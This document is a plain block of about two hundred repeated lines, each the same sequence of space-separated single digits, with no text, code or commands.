   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
 1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
 1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
 1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1      9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
 1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
 1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
      1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
